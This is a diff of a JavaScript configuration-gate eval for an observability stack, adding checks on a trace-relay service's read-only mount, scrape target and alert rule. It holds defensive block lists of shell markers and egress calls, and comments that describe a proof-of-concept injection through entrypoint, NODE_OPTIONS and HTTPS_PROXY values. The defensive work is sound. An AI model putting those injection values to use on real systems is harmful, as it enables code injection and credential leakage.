@@ -1,5 +1,6 @@
 // observability-stack-config.eval.mjs — m20e gates G6 (m20b carryover) + G9
-// (relay/correlation/$trace_pair_set) + the m20e-2 park tripwires.
+// (relay/correlation/$trace_pair_set + the 13r-b mr-trace-relay integration)
+// + the 13r-a and 13r-c park tripwires.
 //
 // WHAT THIS PROVES, AND WHERE
 //   T-a..T-g (always, FIRST) — PROOF-OF-TEETH over inline fixtures. Every
@@ -27,30 +28,74 @@
 //                    the reducers that actually carry a paired enter/exit
 //                    breadcrumb, both directions reported separately (OBS-50's
 //                    single-source-of-truth extension, spec:652-655).
-//   G9g (always)   — PARK TRIPWIRE. The m20e-2 park is honest only while the
-//                    parked things are absent; the moment one lands, this reds
-//                    and names P1-P4.
 //   G9h (always)   — SUPERSESSION TRIPWIRE. The day a paired call site appears,
 //                    observability-log-wrapper.eval.mjs:1589 and
 //                    observability_tests.rs:944 must be retired in the same
 //                    change, and G11 must have run first (OBS-51).
 //   G9i (always)   — the relay accepts no module-owner credential, NEVER writes
-//                    (the batch CLI emits on stdout, so there is no `--out` flag
-//                    and no blessed write call to hide behind), and its pure
-//                    core touches no filesystem at all (OBS-45). "Always" is
-//                    literal: when the files are absent it fails saying so,
-//                    rather than falling silent.
-//   G9j (always)   — relay hygiene over EVERY .mjs under relay/ (tests included,
-//                    per AM12's scope) + the EXACT production file set: a
-//                    missing file fails, and an unexpected extra non-test .mjs
-//                    fails (anti-smuggling — the parked daemon cannot creep back
-//                    in under a new filename).
+//                    (neither the batch CLI nor the daemon has an `--out` flag,
+//                    so there is no blessed write call to hide behind), spells
+//                    neither `0.0.0.0` nor `://` in code, and its pure core
+//                    touches no filesystem at all (OBS-45). "Always" is literal:
+//                    when the files are absent it fails saying so, rather than
+//                    falling silent.
+//   G9j (always)   — relay hygiene over EVERY .mjs under relay/, walked
+//                    RECURSIVELY (tests and subdirectories included, per AM12's
+//                    scope), in THREE ban tiers (PURE / DAEMON / DAEMON-TEST),
+//                    plus the EXACT production file set: a missing file fails,
+//                    and an unexpected extra non-test .mjs fails (anti-smuggling
+//                    — a second daemon cannot creep in under a new filename).
+//                    Every present .mjs must resolve to EXACTLY ONE tier: a
+//                    filename-keyed tier map otherwise fails OPEN for a file
+//                    nobody remembered to list, and the lists are hand-edited.
+//                    The DAEMON tier's EGRESS ban is the P5 TRIPWIRE — see the
+//                    `PARKED — 13r-c` block below.
 //   G9k (always)   — runs `node --test` over the relay suites AND the m20b
 //                    checks suites. This is the only door those suites have:
 //                    nothing else in `just ci` executes them.
+//   G9n (always)   — OBS-45's "the SAME read-only bind mount as Alloy", which
+//                    until 13r-b was UNGATED. Scoped to the `mr-trace-relay`
+//                    service BLOCK and, inside it, to its `volumes:` sub-block:
+//                    a mount whose SOURCE half is string-equal to Alloy's
+//                    replicas source, ending `:ro`, with `--logs-dir` pointing
+//                    inside that mount's CONTAINER target. Plus the injection
+//                    surface every merged predicate misses on this service
+//                    (checkNoExecLogSource is hardcoded to `alloy`,
+//                    checks/stack-config-checks.mjs:539-570): no `entrypoint:`,
+//                    no shell marker, no `env_file:`, no `environment:` key at
+//                    all, and a `command:` flag-name ALLOWLIST.
+//   G9o (always)   — OBS-46's scrape target: `job_name: mr-trace-relay` resolved
+//                    INSIDE `scrape_configs:` (a top-level `x-parked:` decoy must
+//                    not satisfy it), `metrics_path: /health`, host 127.0.0.1,
+//                    and a port CROSS-RESOLVED from the relay's own compose
+//                    `--web.listen-address` — co-occurrence is not wiring, and a
+//                    file-wide search for that flag returns PROMETHEUS's 9090.
+//   G9p (always)   — OBS-46's dead-man's switch, asserted as something that can
+//                    actually FIRE. Beyond "an expr mentioning the relay job":
+//                    the `condition:` refId must resolve to a threshold node over
+//                    the refId that carries the relay expr, and its node type,
+//                    evaluator type, params, datasourceUid, severity label and
+//                    `for:` are all DERIVED FROM THE AlloyDown RULE IN THE SAME
+//                    DOCUMENT rather than re-spelled here. Not paused, distinct
+//                    uid, group interval no coarser than AlloyDown's, and the
+//                    relay expr must NOT also match `job="alloy"` — spec:542-547
+//                    calls one rule watching two processes unbuildable.
+//   L2 (MR_OBS_STACK=1) — LIVE: Prometheus's own /api/v1/targets reports the
+//                    `mr-trace-relay` target with `health: "up"`. This is the
+//                    criterion-level proof of OBS-46 and the only thing that
+//                    catches a /health body Prometheus cannot parse. The skip is
+//                    STATED when the flag is absent, never silent.
 //   T-h..T-l (always, FIRST) — PROOF-OF-TEETH for the 13r-a boot tripwires
 //                    below, over inline fixtures. Every one asserts the GOOD
 //                    shape is ACCEPTED as well as the bad one rejected.
+//   T-m..T-p (always, FIRST) — PROOF-OF-TEETH for 13r-b's G9n/G9o/G9p and the
+//                    retiered G9i/G9j, over inline fixtures. Written as EXECUTED
+//                    CHEATS rather than as a review of the detectors: this
+//                    repo's own history records that a reviewer READING gate
+//                    tests found zero bypasses while one who WROTE the cheat
+//                    found four. T-a is INVERTED by this slice (P1 graduated:
+//                    the 8-service compose is now the shape that must be
+//                    ACCEPTED, and the 7-service one the shape that must not).
 //   G12a (always)  — TEMPO PARK TRIPWIRE (ADR-0190 D1). The `command:` list is
 //                    exactly, IN ORDER, the two committed flags — a SUBSET means
 //                    the parked flag was removed (convert this gate per the
@@ -115,21 +160,43 @@
 //   scoped to m20e-2 and G9g's failure message names P1-P4 by number. Adding a
 //   P5 there would make the header lie and desynchronise G9g.
 //
-// PARKED — m20e-2 (verbatim; do NOT paraphrase into a TBD, anti-pattern 11):
-//   P1  checkServiceSetExact(compose, [...SEVEN, 'mr-trace-relay']) (spec:650)
-//   P2  checkModuleLogsMountReadOnly for the RELAY's own mount, ro not rw
-//       (OBS-45; spec:650-651). AM18: checkModuleLogsMountReadOnly already
-//       generalizes over every `replicas`-sourced mount, so C5 may satisfy P2
-//       automatically once the relay service lands — verify, do not duplicate.
-//   P3  prometheus.yml `job_name: mr-trace-relay` scraping the relay's /health
-//       endpoint (OBS-46; spec:655-656)
-//   P4  grafana alerting dead-man's-switch on that target's `up` metric,
-//       DISTINCT from AlloyDown, and routed to a live contact point (OBS-46;
-//       spec:656-657)
-//   G9g reds the moment any of these becomes landable. Do NOT "helpfully" add a
-//   scrape target or an alert rule for a service that does not exist
-//   (anti-pattern 13): a permanently-zero dead-man's switch trains the operator
-//   to ignore dead-man's switches.
+// GRADUATED — m20e-2 / 13r-b. P1-P4 are no longer parked; they are live gates,
+// and the tripwire that guarded them (G9g, with its checkNoRelayScrapeJob /
+// checkNoRelayAlertRule negatives) is DELETED rather than inverted in place — a
+// same-named predicate whose polarity flipped is a trap for the next reader.
+//   P1 -> C3   checkServiceSetExact(compose, EIGHT_SERVICES)      (spec:650)
+//   P2 -> C5 + G9n  the RELAY's own replicas mount, `:ro` not `:rw`, sourced
+//                   from the SAME host path as Alloy's (OBS-45; spec:650-651).
+//                   C5 alone is NOT enough: its only non-vacuity floor is
+//                   `found === 0` (checks/stack-config-checks.mjs:436), so a
+//                   relay with NO mount at all leaves alloy's `found === 1` and
+//                   C5 still passes. G9n closes that.
+//   P3 -> G9o  prometheus.yml `job_name: mr-trace-relay` -> /health (OBS-46;
+//              spec:655-656)
+//   P4 -> G9p  the grafana dead-man's switch on that target's `up`, DISTINCT
+//              from AlloyDown and able to FIRE (OBS-46; spec:656-657)
+//
+// PARKED — 13r-c (verbatim; do NOT paraphrase into a TBD, anti-pattern 11):
+//   P5  the OTLP POST client. As shipped in 13r-b the daemon emits its OTLP/HTTP
+//       JSON document to STDOUT — the identical contract the batch CLI already
+//       carries (relay/mr-trace-relay.mjs:4-12) — and `docker compose logs
+//       mr-trace-relay` is the sink. Nothing ingests it. This costs zero
+//       observability TODAY and only today: `$trace_pair_set` is EMPTY
+//       (ADR-0180:1022, relay/README.md), so the reconstructed document is
+//       `{"resourceSpans":[]}` REGARDLESS of sink. Building the client now would
+//       add an HTTP egress surface, a retry/backoff state machine and a
+//       header-allowlist obligation to POST an empty array on a loop.
+//   The un-defer trigger is ALREADY MECHANIZED, not remembered: G9h reds at the
+//   first paired call site, i.e. the first moment a span could exist. When P5
+//   graduates, the SAME change must (1) add the transport as an INJECTED seam
+//   with its outgoing header key set asserted exactly (never an Authorization or
+//   x-api-key header), (2) relax exactly the needles it needs from
+//   DAEMON_EGRESS_BANS below, naming each one and why, and (3) delete this block.
+//   Until then the daemon has ZERO egress and G9j's DAEMON tier bans it flatly:
+//   `fetch(`, `.request(`, `.connect(`, `node:https`, `node:net` and `undici`
+//   are all banned in daemon.mjs, so the moment an outbound POST lands there
+//   WITHOUT this block being graduated, G9j reds and names P5. Do NOT widen the
+//   ban list to make a POST fit — graduate the park.
 //
 // MEASURED COST (S3): the G9k subprocess is the only non-trivial cost in this
 // eval; it is bounded by NODE_TEST_TIMEOUT_MS and its wall time is recorded in
@@ -171,13 +238,25 @@ import {
 // Constants
 // ===========================================================================
 
-const NAME = 'observability-stack-config (G6 + G9 + m20e-2 park tripwires, ADR-0180)';
+const NAME =
+  'observability-stack-config (G6 + G9 + mr-trace-relay integration + 13r-a/13r-c park ' +
+  'tripwires, ADR-0180/0190/0191)';
 
 const OPS = 'ops/observability';
 const RELAY_REL = `${OPS}/relay`;
 
-/** D3/OBS-19: the stack is exactly these seven services, no more, no fewer. */
-export const SEVEN_SERVICES = [
+const RELAY_SERVICE_NAME = 'mr-trace-relay';
+
+/**
+ * D3/OBS-19: the stack is exactly these EIGHT services, no more, no fewer.
+ *
+ * 13r-b: `mr-trace-relay` is the 8th (P1, spec:650 / OBS-46). It was parked
+ * through m20b and m20e-2 because config-without-service pins `up=0` forever and
+ * service-without-config is dead code; this slice lands BOTH halves at once, so
+ * the park is discharged rather than waived. The set is compared for EQUALITY,
+ * never counted — a substitution keeps the count identical (T-a).
+ */
+export const EIGHT_SERVICES = [
   'prometheus',
   'alloy',
   'loki',
@@ -185,6 +264,7 @@ export const SEVEN_SERVICES = [
   'grafana',
   'node_exporter',
   'caddy',
+  RELAY_SERVICE_NAME,
 ];
 
 /**
@@ -192,6 +272,13 @@ export const SEVEN_SERVICES = [
  * The digest is read from the compose file (a digest bump is a legitimate,
  * reviewed change and must not require editing three files); the repository
  * name is what a banned tool would have to change, and it is pinned here.
+ *
+ * 13r-b (D5): the relay runs the STOCK `node` image, digest-pinned like every
+ * other pulled image — it is deliberately NOT a second built stage, because
+ * ADR-0180 D3 makes caddy "the ONE image built rather than pulled" and gives it
+ * a differentiated upstream-CVE obligation the other services do not carry.
+ * C4 requires the image-bearing service set to equal this map's KEY set exactly,
+ * so this entry is not optional bookkeeping: without it C4 reds.
  */
 export const ALLOWED_IMAGE_REPOS = {
   prometheus: 'prom/prometheus',
@@ -200,19 +287,47 @@ export const ALLOWED_IMAGE_REPOS = {
   tempo: 'grafana/tempo',
   grafana: 'grafana/grafana',
   node_exporter: 'prom/node-exporter',
+  [RELAY_SERVICE_NAME]: 'node',
 };
 
 /** D12/OBS-36: the S2 label enum. `caddy` builds from a Dockerfile, no image. */
 const D12_ALLOWED_LABELS = ['reducer', 'evt'];
-const HOST_NATIVE_ALLOWLIST = ['up', 'spacetime_', 'node_'];
+
+/**
+ * C15 (`checkQueriedSeriesAreDefined`) treats a queried series that no recording
+ * rule defines as DANGLING unless its name starts with one of these prefixes,
+ * i.e. unless it is host-native rather than repo-defined.
+ *
+ * 13r-b (AM3) adds `mr_trace_relay_`: the daemon's /health endpoint serves a
+ * real, LABEL-FREE exposition body (`mr_trace_relay_lines_read_total` and
+ * `mr_trace_relay_last_read_timestamp_seconds`) rather than an empty one. That
+ * is not decoration — it is what makes the body a valid exposition document BY
+ * CONSTRUCTION, closing the whole "200 with a body Prometheus cannot parse ->
+ * up=0 -> the dead-man's switch pinned firing" landmine class (verified against
+ * prom/prometheus:v3.13.2: `ok` -> up=0, `204 No Content` -> up=0), and it is
+ * what makes a SILENTLY STALLED tail visible, which `up` alone cannot catch.
+ */
+const HOST_NATIVE_ALLOWLIST = ['up', 'spacetime_', 'node_', 'mr_trace_relay_'];
 
 /** OBS-50: never in `$trace_pair_set`, independent of any parsed set. */
 const ALWAYS_BANNED_REDUCER = 'movement_tick';
 
-const RELAY_PURE_FILES = ['parse.mjs', 'pair.mjs', 'otlp.mjs', 'reconstruct.mjs'];
-const RELAY_SHELL_FILE = 'mr-trace-relay.mjs';
-const RELAY_PRODUCTION_FILES = [...RELAY_PURE_FILES, RELAY_SHELL_FILE];
-const RELAY_TEST_FILES = RELAY_PURE_FILES.map((f) => f.replace('.mjs', '.test.mjs'));
+/**
+ * The relay's file layout (D1). `tail.mjs` is the PURE tail state machine —
+ * `{path, prevOffset, prevIdentity}` + a fresh observation -> `{readFrom,
+ * readTo, reason}`, with no fs, clock, timer or socket reachable from any path —
+ * so it joins the pure core rather than the shell. `daemon.mjs` is the
+ * imperative shell that owns statSync/createReadStream, the node:http /health
+ * server and the single timer.
+ */
+const RELAY_PURE_FILES = ['parse.mjs', 'pair.mjs', 'otlp.mjs', 'reconstruct.mjs', 'tail.mjs'];
+const RELAY_BATCH_CLI_FILE = 'mr-trace-relay.mjs';
+const RELAY_DAEMON_FILE = 'daemon.mjs';
+const RELAY_DAEMON_TEST_FILE = 'daemon.test.mjs';
+const RELAY_SHELL_FILES = [RELAY_BATCH_CLI_FILE, RELAY_DAEMON_FILE];
+const RELAY_PRODUCTION_FILES = [...RELAY_PURE_FILES, ...RELAY_SHELL_FILES];
+const RELAY_PURE_TEST_FILES = RELAY_PURE_FILES.map((f) => f.replace('.mjs', '.test.mjs'));
+const RELAY_TEST_FILES = [...RELAY_PURE_TEST_FILES, RELAY_DAEMON_TEST_FILE];
 
 const TRACE_PAIR_SET_REL = `${RELAY_REL}/trace-pair-set.json`;
 
@@ -222,8 +337,16 @@ const TRACE_PAIR_SET_REL = `${RELAY_REL}/trace-pair-set.json`;
  *
  * FLOOR DERIVATION (re-run after adding or removing any test in these files):
  *   grep -c '^test(' ops/observability/relay/*.test.mjs ops/observability/checks/*.test.mjs
- * At authoring time: parse 21 + pair 18 + otlp 14 + reconstruct 12 = 65 relay,
- * plus checks 103 + redteam 13 = 116, total 181.
+ * Before 13r-b: parse 21 + pair 18 + otlp 14 + reconstruct 12 = 65 relay, plus
+ * checks 103 + redteam 13 = 116, total 181.
+ *
+ * TODO(13r-b): re-derive NODE_TEST_PASS_FLOOR once `tail.test.mjs` and
+ * `daemon.test.mjs` exist. Run the grep above VERBATIM, sum the counts, and
+ * replace both the arithmetic line and the number below in the SAME edit. Do
+ * NOT guess: a floor set below the real count is a suite that can silently stop
+ * running, and a floor set above it reds a green tree. The value below is the
+ * pre-13r-b figure and is therefore a LOWER BOUND that no longer bites on the
+ * two new suites.
  */
 const NODE_TEST_FILES = [
   ...RELAY_TEST_FILES.map((f) => `${RELAY_REL}/${f}`),
@@ -915,39 +1038,889 @@ export function checkExactSetEquality(configNames, scannedNames) {
 }
 
 // ===========================================================================
-// G9g — park tripwire helpers
+// G9n/G9o/G9p — the GRADUATED P1-P4 assertions (13r-b; OBS-45/OBS-46)
+//
+// These three functions REPLACE the m20e-2 park tripwire's `checkNoRelayScrapeJob`
+// and `checkNoRelayAlertRule`. They are deliberately NEW NAMES rather than the
+// old ones with their polarity inverted: a predicate called "checkNoRelayX" that
+// now requires X is a trap for every future reader, and grep for the old names
+// should turn up nothing rather than something that means the opposite.
+//
+// Every one of them is SCOPED — to a compose service block, to a `volumes:`
+// sub-block, to `scrape_configs:`, to a single `- uid:` rule — because the
+// defect class here is co-occurrence read as wiring. Three measured examples:
+//   * `checkNoExecLogSource` (checks/stack-config-checks.mjs:539-570) is
+//     hardcoded to the `alloy` service, so a relay block carrying a shell-exfil
+//     `entrypoint:`, an `env_file:`, `NODE_OPTIONS=--import=/opt/relay/pwn.mjs`,
+//     `NODE_USE_ENV_PROXY=1`, an `HTTPS_PROXY` with credentials in it and an
+//     `MR_RELAY_KEY` passed C3, C5, C6, C7 AND C17 (PoC'd).
+//   * a file-wide `indexOf('--web.listen-address=')` over docker-compose.yml
+//     returns PROMETHEUS's `127.0.0.1:9090` (docker-compose.yml:51 is the first
+//     occurrence), so an unscoped G9o would compare the relay's scrape port
+//     against the wrong service's flag and pass a broken target.
+//   * `AlloyDown` thresholds via an `__expr__` node, NOT in its expr
+//     (rules.yml:59-69), so a relay rule with a `gt` evaluator, `isPaused: true`
+//     or a dangling `condition:` refId satisfies "the expr mentions the relay"
+//     and never fires.
 // ===========================================================================
 
-const RELAY_SERVICE_NAME = 'mr-trace-relay';
+const ALLOY_JOB_MATCHER = `job=${DQ}alloy${DQ}`;
+const ALLOY_UP_NEEDLE = `up{${ALLOY_JOB_MATCHER}}`;
+const RELAY_JOB_MATCHER = `job=${DQ}${RELAY_SERVICE_NAME}${DQ}`;
+const RELAY_UP_NEEDLE = `up{${RELAY_JOB_MATCHER}}`;
 
-export function checkNoRelayScrapeJob(prometheusYmlText) {
-  const lines = stripHashComments(prometheusYmlText).split('\n');
-  const jobs = [];
-  for (const line of lines) {
-    const t = line.trim();
-    if (t.startsWith('- job_name:')) jobs.push(scalarOf(t.slice(2), 'job_name'));
-    else if (t.startsWith('job_name:')) jobs.push(scalarOf(t, 'job_name'));
+/** Exactly one `key:` at `indent`; anything else is a fail-loud result. */
+function scopedScalar(lines, key, indent, where) {
+  const idx = keyIndices(lines, key, indent);
+  if (idx.length !== 1) {
+    return fail(`${where} declares ${idx.length} \`${key}:\` keys; exactly 1 is required`);
   }
-  if (jobs.length === 0) {
-    return fail('G9g: prometheus.yml declares zero scrape jobs — nothing was scanned');
-  }
-  if (jobs.includes(RELAY_SERVICE_NAME)) {
-    return fail(`G9g: a \`job_name: ${RELAY_SERVICE_NAME}\` scrape target is present`);
-  }
-  return pass(`G9g: ${jobs.length} scrape jobs (${jobs.join(', ')}), none for the parked relay`);
+  return { ok: true, value: scalarOf(lines[idx[0]], key), index: idx[0] };
 }
 
-export function checkNoRelayAlertRule(alertRulesText) {
+/** Exactly one `key:` at `indent`, returning its sub-block plus its own index. */
+function scopedBlock(lines, key, indent, where) {
+  const idx = keyIndices(lines, key, indent);
+  if (idx.length !== 1) {
+    return fail(`${where} declares ${idx.length} \`${key}:\` blocks; exactly 1 is required`);
+  }
+  return { ok: true, lines: subBlock(lines, idx[0]), index: idx[0] };
+}
+
+/**
+ * Split a compose SHORT-FORM mount item on its TOP-LEVEL `:` separators — i.e.
+ * ignoring the ones inside a `${VAR:-default}` interpolation.
+ *
+ * Alloy's own replicas mount is
+ * `${MR_SPACETIME_DATA_DIR:-/var/lib/spacetime}/replicas:/data/module-logs:ro`,
+ * whose SOURCE half itself contains `:-`. A naive `split(':')` yields four
+ * fragments, reads `-/var/lib/spacetime}/replicas` as the container target and
+ * `/data/module-logs` as the mode — i.e. it silently mis-reads every mount in
+ * this file that uses an env default, which is the only one that matters here.
+ */
+function splitMountItem(item) {
+  const parts = [];
+  let current = '';
+  let depth = 0;
+  for (let i = 0; i < item.length; i++) {
+    const ch = item[i];
+    if (ch === '$' && item[i + 1] === '{') {
+      depth++;
+      current += '${';
+      i++;
+      continue;
+    }
+    if (ch === '}' && depth > 0) {
+      depth--;
+      current += ch;
+      continue;
+    }
+    if (ch === ':' && depth === 0) {
+      parts.push(current);
+      current = '';
+      continue;
+    }
+    current += ch;
+  }
+  parts.push(current);
+  return parts;
+}
+
+/** A flow-style `['a', 'b']` scalar list. null when it is not flow style. */
+function flowListItems(raw) {
+  const t = raw.trim();
+  if (!t.startsWith('[') || !t.endsWith(']')) return null;
+  const inner = t.slice(1, -1).trim();
+  if (inner.length === 0) return [];
+  return inner.split(',').map((piece) => scalarOf(`x: ${piece.trim()}`, 'x'));
+}
+
+// ---------------------------------------------------------------------------
+// G9n — the relay's own bind mount, and the relay block as an ALLOWLIST
+// ---------------------------------------------------------------------------
+
+/**
+ * Mirrors `SHELL_MARKERS` at checks/stack-config-checks.mjs:517. It is copied
+ * rather than imported because the module does not export it, and because the
+ * predicate that uses it there is hardcoded to the `alloy` service — importing
+ * the check would inherit exactly the scoping bug this gate exists to close.
+ * If that list gains a marker, add it here in the same change.
+ */
+const RELAY_SHELL_MARKERS = [
+  '/bin/sh',
+  '/bin/bash',
+  'sh -c',
+  'bash -c',
+  'tail -F',
+  'tail -f',
+  ' | ',
+];
+
+/**
+ * AM16(d): the relay's accepted flag set is EXACTLY these three. An allowlist
+ * beats enumerating credential-ish names (`--token`, `--api-key`, ...): those
+ * can always be spelled one way the list did not anticipate, while an unknown
+ * flag of ANY name fails this.
+ *
+ * `--web.listen-address` is not a free choice: `LISTEN_FLAGS`
+ * (checks/stack-config-checks.mjs:448-454) is a hardcoded 5-entry list and
+ * `checkListenAddrsLoopback` FAILS CLOSED (:494-499) for a service matching
+ * none of them, so a natural `--health-listen-addr=` would red C6. It is also
+ * the Prometheus-ecosystem convention and the relay IS a scrape target — the
+ * checker compatibility is a consequence, not the reason. Recorded in ADR-0191
+ * with the right follow-up (per-service binding sources, eval:97-107).
+ */
+const RELAY_COMMAND_FLAGS = ['--logs-dir', '--web.listen-address', '--trace-pair-set'];
+
+/**
+ * Keys the relay service may not declare AT ALL, each with its own reason:
+ *   entrypoint — REPLACES the node binary outright; no marker list can bound
+ *                what a replaced entrypoint does (the checks module says the
+ *                same thing about alloy at :543-550, for the same reason).
+ *   env_file   — smuggles arbitrary environment in from a file no single-file
+ *                detector reads, exactly as `extends:` does for compose keys.
+ *   environment — not "no credential-shaped env var": NO env block at all. The
+ *                node runtime reads `NODE_OPTIONS`, `NODE_USE_ENV_PROXY`,
+ *                `HTTPS_PROXY` and friends from the environment, so a
+ *                denylist of names is unclosable here. The relay's entire
+ *                configuration surface is its three command flags.
+ */
+const RELAY_BANNED_KEYS = ['entrypoint', 'env_file', 'environment'];
+
+/** The `command:` list items of the relay service, scoped and fail-loud. */
+function relayCommandItems(composeText) {
+  const block = composeServiceBlockScoped(composeText, RELAY_SERVICE_NAME);
+  if (!block.ok) return fail(`the \`${RELAY_SERVICE_NAME}\` service — ${block.detail}`);
+  const idx = keyIndices(block.lines, 'command', 4);
+  if (idx.length !== 1) {
+    return fail(
+      `the \`${RELAY_SERVICE_NAME}\` service declares ${idx.length} \`command:\` keys; exactly 1 ` +
+        'is required. A missing command hands the container the image default, which for ' +
+        '`node:*-alpine` is a REPL.',
+    );
+  }
+  if (scalarOf(block.lines[idx[0]], 'command').length > 0) {
+    return fail(
+      `the \`${RELAY_SERVICE_NAME}\` service's \`command:\` is inline/flow style, which this ` +
+        'scanner cannot read — fail loud rather than compare against a partial parse',
+    );
+  }
+  const items = scalarListUnder(block.lines, idx[0]);
+  if (!items.ok)
+    return fail(`the \`${RELAY_SERVICE_NAME}\` service's \`command:\` — ${items.detail}`);
+  if (items.values.length === 0) {
+    return fail(`the \`${RELAY_SERVICE_NAME}\` service's \`command:\` declares ZERO items`);
+  }
+  return { ok: true, values: items.values, blockLines: block.lines };
+}
+
+/** The `=`-joined value of one relay command flag, fail-loud on 0 or >1. */
+function relayFlagValue(items, flag) {
+  const prefix = `${flag}=`;
+  const matches = items.filter((i) => i.startsWith(prefix));
+  if (matches.length !== 1) {
+    return fail(
+      `the \`${RELAY_SERVICE_NAME}\` service declares ${matches.length} \`${prefix}\` command ` +
+        'items; exactly 1 is required, in the `=`-joined form (a space-separated pair becomes a ' +
+        'separate list item that `checkListenAddrsLoopback` cannot associate with its flag)',
+    );
+  }
+  return { ok: true, value: matches[0].slice(prefix.length) };
+}
+
+export function checkRelayMountMirrorsAlloy(composeText) {
+  // 1. Alloy's replicas mount SOURCE — read, never re-spelled. OBS-45 says "the
+  //    same read-only bind mount as Alloy", and "the same" is a claim about the
+  //    HOST path: if that path moves, both services move together or neither is
+  //    reading what the other reads.
+  const alloy = composeServiceBlockScoped(composeText, 'alloy');
+  if (!alloy.ok) return fail(`G9n: the alloy service — ${alloy.detail}`);
+  const alloyVolumes = scopedBlock(alloy.lines, 'volumes', 4, 'G9n: the alloy service');
+  if (!alloyVolumes.ok) return fail(`G9n: ${alloyVolumes.detail}`);
+  const alloyMounts = scalarListUnder(alloy.lines, alloyVolumes.index);
+  if (!alloyMounts.ok) return fail(`G9n: alloy's \`volumes:\` — ${alloyMounts.detail}`);
+  const alloyReplicas = alloyMounts.values.filter((v) => splitMountItem(v)[0].includes('replicas'));
+  if (alloyReplicas.length !== 1) {
+    return fail(
+      `G9n: the alloy service declares ${alloyReplicas.length} \`replicas\`-sourced mounts; ` +
+        "exactly 1 is required, because this gate DERIVES the relay's expected mount source from " +
+        'it rather than re-spelling the path here',
+    );
+  }
+  const alloySource = splitMountItem(alloyReplicas[0])[0];
+
+  // 2. The relay block itself, as an allowlist rather than a checklist.
+  const relay = composeServiceBlockScoped(composeText, RELAY_SERVICE_NAME);
+  if (!relay.ok) {
+    return fail(
+      `G9n (OBS-45/OBS-46): the \`${RELAY_SERVICE_NAME}\` service — ${relay.detail}. This slice ` +
+        'lands the service, its scrape target and its alert rule in ONE change: shipping the ' +
+        'config without the process pins up=0 forever.',
+    );
+  }
+  for (const banned of RELAY_BANNED_KEYS) {
+    if (keyIndices(relay.lines, banned, 4).length > 0) {
+      return fail(
+        `G9n (OBS-45): the \`${RELAY_SERVICE_NAME}\` service declares \`${banned}:\`. This block ` +
+          'is NOT covered by checkNoExecLogSource (C7), which is hardcoded to the `alloy` service ' +
+          '(checks/stack-config-checks.mjs:539-570) — a relay block with a shell-exfil ' +
+          '`entrypoint:`, an `env_file:` and an `HTTPS_PROXY`/`NODE_OPTIONS` environment passed ' +
+          "C3, C5, C6, C7 AND C17 when this was PoC'd. The relay's entire configuration surface " +
+          `is its ${RELAY_COMMAND_FLAGS.length} command flags; there is nothing for an ` +
+          'environment block to legitimately carry.',
+      );
+    }
+  }
+  const relayText = relay.lines.join('\n');
+  const marker = RELAY_SHELL_MARKERS.find((m) => relayText.includes(m));
+  if (marker !== undefined) {
+    return fail(
+      `G9n (OBS-11/OBS-45): the \`${RELAY_SERVICE_NAME}\` service block contains \`${marker}\` — ` +
+        'a shell pipeline there reaches the module logs OUTSIDE everything this eval reads, which ' +
+        'is the banned subprocess log source wearing a different service name',
+    );
+  }
+
+  // 3. The mount: same SOURCE as alloy's, read-only, and the logs dir inside it.
+  const relayVolumes = scopedBlock(
+    relay.lines,
+    'volumes',
+    4,
+    `G9n: the \`${RELAY_SERVICE_NAME}\` service`,
+  );
+  if (!relayVolumes.ok) {
+    return fail(
+      `G9n (OBS-45/P2): ${relayVolumes.detail}. NOTE: C5 (checkModuleLogsMountReadOnly) cannot ` +
+        'catch this — its only non-vacuity floor is `found === 0` ' +
+        '(checks/stack-config-checks.mjs:436), so a relay with NO mount at all still leaves ' +
+        "alloy's one and C5 passes. This gate is what proves the relay HAS the mount.",
+    );
+  }
+  const relayMounts = scalarListUnder(relay.lines, relayVolumes.index);
+  if (!relayMounts.ok) {
+    return fail(
+      `G9n: the \`${RELAY_SERVICE_NAME}\` service's \`volumes:\` — ${relayMounts.detail}`,
+    );
+  }
+  if (relayMounts.values.length === 0) {
+    return fail(
+      `G9n (OBS-45/P2): the \`${RELAY_SERVICE_NAME}\` service declares a \`volumes:\` key with ` +
+        'ZERO mounts — nothing was compared',
+    );
+  }
+  const matching = relayMounts.values.filter((v) => splitMountItem(v)[0] === alloySource);
+  if (matching.length !== 1) {
+    const sources = relayMounts.values.map((v) => splitMountItem(v)[0]);
+    return fail(
+      `G9n (OBS-45/P2): the \`${RELAY_SERVICE_NAME}\` service declares ${matching.length} mounts ` +
+        `whose SOURCE half is string-equal to alloy's \`${alloySource}\`; exactly 1 is required. ` +
+        `Its mount sources are [${sources.join(', ')}]. OBS-45 says the relay reads the module ` +
+        'logs "via the SAME read-only bind mount as Alloy": a second host path that happens to ' +
+        'hold a copy of the same files is not the same mount, and it drifts the first time either ' +
+        'side is re-pointed.',
+    );
+  }
+  const parts = splitMountItem(matching[0]);
+  if (parts.length !== 3 || parts[2] !== 'ro' || !matching[0].endsWith(':ro')) {
+    return fail(
+      `G9n (OBS-45/P2): the relay's replicas mount is \`${matching[0]}\`, which is not \`:ro\`. A ` +
+        'bare short-form mount defaults to READ-WRITE in Docker, so omission is the trap: the ' +
+        'relay would hold a writable handle on the SpacetimeDB data directory, which is exactly ' +
+        'what OBS-45 forbids.',
+    );
+  }
+  const target = parts[1];
+  if (target.length === 0 || !target.startsWith('/')) {
+    return fail(`G9n: the relay's replicas mount has an unreadable container target \`${target}\``);
+  }
+
+  // 4. The command: an exact flag allowlist, and --logs-dir INSIDE the mount.
+  const cmd = relayCommandItems(composeText);
+  if (!cmd.ok) return fail(`G9n: ${cmd.detail}`);
+  if (cmd.values[0] !== 'node') {
+    return fail(
+      `G9n (AM5): the relay's \`command:\` begins with \`${cmd.values[0]}\`, expected \`node\`. ` +
+        'The `node:*-alpine` entrypoint does `set -- node "$@"` only when $1 does NOT start with ' +
+        '`-`; a bare `--web.listen-address=...` as the first item is therefore parsed as a NODE ' +
+        'CLI option and the container dies on start. Use the full list form ' +
+        '(`node`, `/opt/relay/daemon.mjs`, then the flags) and still NO `entrypoint:`.',
+    );
+  }
+  const flagNames = cmd.values
+    .filter((v) => v.startsWith('--'))
+    .map((v) => (v.indexOf('=') === -1 ? v : v.slice(0, v.indexOf('='))));
+  const unexpected = flagNames.filter((f) => !RELAY_COMMAND_FLAGS.includes(f));
+  const missingFlags = RELAY_COMMAND_FLAGS.filter((f) => !flagNames.includes(f));
+  if (
+    unexpected.length > 0 ||
+    missingFlags.length > 0 ||
+    flagNames.length !== new Set(flagNames).size
+  ) {
+    return fail(
+      `G9n (OBS-45, AM16(d)): the relay's command flag names are [${flagNames.join(', ')}], ` +
+        `expected EXACTLY [${RELAY_COMMAND_FLAGS.join(', ')}] — unexpected ` +
